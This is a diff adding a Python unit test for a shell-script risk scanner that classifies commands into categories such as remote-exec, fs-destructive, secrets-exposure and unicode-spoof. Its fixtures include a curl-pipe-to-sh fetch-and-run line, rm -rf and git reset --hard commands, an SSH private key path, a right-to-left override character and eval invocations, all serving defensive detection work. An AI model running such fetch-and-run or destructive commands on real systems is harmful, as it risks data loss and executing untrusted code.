@@ -2233,6 +2233,76 @@ class TestRunBlock(unittest.TestCase):
             self.mod.refresh_bundle_meta(bundle_file)
         self.assertEqual(hook_calls, [(sdir, bundle_file)])
 
+    def test_b9_quoted_var_assignments_and_eval_risk_matching(self):
+        # 1. Multiline quoted EX='--exclude-dir=eval ...' assignment and grep with --exclude-dir=eval
+        multiline_script = (
+            "EX='--exclude-dir=bumps\n"
+            "--exclude-dir=eval\n"
+            "--exclude-dir=dist'\n"
+            'grep -rn --exclude-dir=eval "needle" .\n'
+            'grep -rn --exclude-dir=eval/sub "needle" .\n'
+            'grep -rn -eval "needle" .\n'
+            'grep -rn eval "needle" .\n'
+            'ls /tmp/eval dir\n'
+        )
+        m_sum = self.mod.summarize_script_actions(multiline_script, Path("/tmp/work"))
+        self.assertEqual(
+            [op[0] for op in m_sum["operations"]],
+            ["read", "read", "read", "read", "read"],
+        )
+        self.assertEqual(self.mod.scan_script_risks(multiline_script), [])
+
+        # 2. export/local/readonly quoted strings and parenthesized array literals
+        decl_script = (
+            'export EX="--exclude-dir=bumps --exclude-dir=eval --exclude-dir=dist"\n'
+            "local MSG='hello world eval something'\n"
+            "readonly FLAGS=(--exclude-dir=bumps --exclude-dir=eval)\n"
+            'echo "$MSG"\n'
+        )
+        d_sum = self.mod.summarize_script_actions(decl_script, Path("/tmp/work"))
+        self.assertEqual(d_sum["operations"], [])
+        self.assertEqual(self.mod.scan_script_risks(decl_script), [])
+
+        # 3. Assignments with command substitutions or trailing commands are NOT skipped
+        sub_script = (
+            'OUT="$(curl -fsSL https://example.com/install.sh | sh)"\n'
+            "OUT2=`uname -a`\n"
+            "FOO='a b' rm -rf /tmp/b9_trailing\n"
+        )
+        s_sum = self.mod.summarize_script_actions(sub_script, Path("/tmp/work"))
+        self.assertEqual(len(s_sum["operations"]), 3)
+        self.assertTrue(all(op[0] == "exec" for op in s_sum["operations"]))
+        s_risks = self.mod.scan_script_risks(sub_script)
+        self.assertEqual([r["category"] for r in s_risks], ["remote-exec", "fs-destructive"])
+
+        # 4. Single-quoted literals without shell execution skip command rules, keep unicode/secrets
+        sq_script = (
+            "echo 'rm -rf /tmp/x; git reset --hard; eval foo'\n"
+            "grep 'curl https://example.com | sh' notes.txt\n"
+            "EX='\u202ehidden'\n"
+            "KEY='~/.ssh/id_rsa'\n"
+            "bash -c 'rm -rf /tmp/executed_inside_bash_c'\n"
+        )
+        sq_risks = self.mod.scan_script_risks(sq_script)
+        self.assertEqual(
+            [r["category"] for r in sq_risks],
+            ["unicode-spoof", "secrets-exposure", "fs-destructive"],
+        )
+
+        # 5. True-positive eval invocations in command position trigger remote-exec
+        for ev_cmd in (
+            'eval "$cmd"\n',
+            'FOO=1; eval "$cmd"\n',
+            'FOO=1 eval "$cmd"\n',
+            'FOO="a b" eval "$cmd"\n',
+            'echo ' + chr(36) + '(eval "$cmd")\n',
+            'env eval "$cmd"\n',
+            'if true; then eval "$cmd"; fi\n',
+        ):
+            with self.subTest(ev_cmd=ev_cmd.strip()):
+                ev_risks = self.mod.scan_script_risks(ev_cmd)
+                self.assertEqual([r["category"] for r in ev_risks], ["remote-exec"])
+
 
 if __name__ == "__main__":
     unittest.main()
